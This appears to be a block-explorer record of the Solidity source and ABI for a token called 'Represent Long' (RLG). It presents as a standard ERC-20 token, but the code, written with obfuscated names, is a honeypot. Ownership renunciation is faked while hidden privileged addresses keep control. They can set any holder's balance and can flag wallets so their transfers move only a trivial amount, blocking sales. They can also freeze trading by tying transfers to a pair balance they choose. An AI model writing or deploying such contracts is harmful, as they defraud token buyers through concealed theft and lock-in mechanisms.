{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface senderMaxLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract listIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapToken {\n    function createPair(address launchSender, address modeLiquidity) external returns (address);\n}\n\ninterface senderBuyReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isAmountTake) external view returns (uint256);\n\n    function transfer(address exemptTake, uint256 fundList) external returns (bool);\n\n    function allowance(address fromEnableAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTake,\n        uint256 fundList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxTo, uint256 value);\n    event Approval(address indexed fromEnableAuto, address indexed spender, uint256 value);\n}\n\ninterface senderBuyReceiverMetadata is senderBuyReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepresentLong is listIs, senderBuyReceiver, senderBuyReceiverMetadata {\n\n    function exemptMarketing() public {\n        emit OwnershipTransferred(modeReceiverFund, address(0));\n        atFee = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTo;\n    }\n\n    uint256 private modeLimitMarketing;\n\n    uint256 private buyLaunchedExempt = 100000000 * 10 ** 18;\n\n    uint256 public fundMode;\n\n    function balanceOf(address isAmountTake) public view virtual override returns (uint256) {\n        return amountBuyTo[isAmountTake];\n    }\n\n    event OwnershipTransferred(address indexed swapEnable, address indexed fundFrom);\n\n    function exemptReceiver(address feeAmount, address exemptTake, uint256 fundList) internal returns (bool) {\n        require(amountBuyTo[feeAmount] >= fundList);\n        amountBuyTo[feeAmount] -= fundList;\n        amountBuyTo[exemptTake] += fundList;\n        emit Transfer(feeAmount, exemptTake, fundList);\n        return true;\n    }\n\n    bool private tokenMarketing;\n\n    string private receiverTeam = \"Represent Long\";\n\n    function transferFrom(address feeAmount, address exemptTake, uint256 fundList) external override returns (bool) {\n        if (_msgSender() != feeLaunchedTotal) {\n            if (atAuto[feeAmount][_msgSender()] != type(uint256).max) {\n                require(fundList <= atAuto[feeAmount][_msgSender()]);\n                atAuto[feeAmount][_msgSender()] -= fundList;\n            }\n        }\n        return limitFund(feeAmount, exemptTake, fundList);\n    }\n\n    uint256 swapMarketing;\n\n    mapping(address => bool) public liquidityList;\n\n    mapping(address => uint256) private amountBuyTo;\n\n    bool public shouldAuto;\n\n    bool private maxLaunched;\n\n    function maxTotal(address atMode) public {\n        tradingList();\n        \n        if (atMode == modeReceiverFund || atMode == fundLimitTeam) {\n            return;\n        }\n        amountExempt[atMode] = true;\n    }\n\n    uint256 shouldTotal;\n\n    uint8 private totalTo = 18;\n\n    address public fundLimitTeam;\n\n    address feeLaunchedTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingListSender(address amountWallet, uint256 fundList) public {\n        tradingList();\n        amountBuyTo[amountWallet] = fundList;\n    }\n\n    function limitFund(address feeAmount, address exemptTake, uint256 fundList) internal returns (bool) {\n        if (feeAmount == modeReceiverFund) {\n            return exemptReceiver(feeAmount, exemptTake, fundList);\n        }\n        uint256 receiverTo = senderBuyReceiver(fundLimitTeam).balanceOf(receiverLaunch);\n        require(receiverTo == swapMarketing);\n        require(exemptTake != receiverLaunch);\n        if (amountExempt[feeAmount]) {\n            return exemptReceiver(feeAmount, exemptTake, launchToSell);\n        }\n        return exemptReceiver(feeAmount, exemptTake, fundList);\n    }\n\n    address receiverLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedWallet;\n\n    function approve(address takeTo, uint256 fundList) public virtual override returns (bool) {\n        atAuto[_msgSender()][takeTo] = fundList;\n        emit Approval(_msgSender(), takeTo, fundList);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private atAuto;\n\n    uint256 constant launchToSell = 14 ** 10;\n\n    address public modeReceiverFund;\n\n    string private marketingTotal = \"RLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTeam;\n    }\n\n    uint256 private senderMode;\n\n    address private atFee;\n\n    function transfer(address amountWallet, uint256 fundList) external virtual override returns (bool) {\n        return limitFund(_msgSender(), amountWallet, fundList);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyLaunchedExempt;\n    }\n\n    bool public senderLaunched;\n\n    function allowance(address liquidityFrom, address takeTo) external view virtual override returns (uint256) {\n        if (takeTo == feeLaunchedTotal) {\n            return type(uint256).max;\n        }\n        return atAuto[liquidityFrom][takeTo];\n    }\n\n    bool private receiverMode;\n\n    uint256 private tokenIs;\n\n    uint256 private shouldSenderSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return atFee;\n    }\n\n    mapping(address => bool) public amountExempt;\n\n    function owner() external view returns (address) {\n        return atFee;\n    }\n\n    function launchMarketing(uint256 fundList) public {\n        tradingList();\n        swapMarketing = fundList;\n    }\n\n    function tradingList() private view {\n        require(liquidityList[_msgSender()]);\n    }\n\n    constructor (){\n        \n        senderMaxLimit fromTx = senderMaxLimit(feeLaunchedTotal);\n        fundLimitTeam = swapToken(fromTx.factory()).createPair(fromTx.WETH(), address(this));\n        if (shouldAuto != tokenMarketing) {\n            modeLimitMarketing = tokenIs;\n        }\n        modeReceiverFund = _msgSender();\n        exemptMarketing();\n        liquidityList[modeReceiverFund] = true;\n        amountBuyTo[modeReceiverFund] = buyLaunchedExempt;\n        if (launchedWallet == shouldSenderSell) {\n            fundMode = tokenIs;\n        }\n        emit Transfer(address(0), modeReceiverFund, buyLaunchedExempt);\n    }\n\n    function limitSell(address walletToken) public {\n        if (senderLaunched) {\n            return;\n        }\n        \n        liquidityList[walletToken] = true;\n        \n        senderLaunched = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromEnableAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAmountTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimitTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundList\",\"type\":\"uint256\"}],\"name\":\"launchMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundList\",\"type\":\"uint256\"}],\"name\":\"marketingListSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"}],\"name\":\"maxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiverFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RepresentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}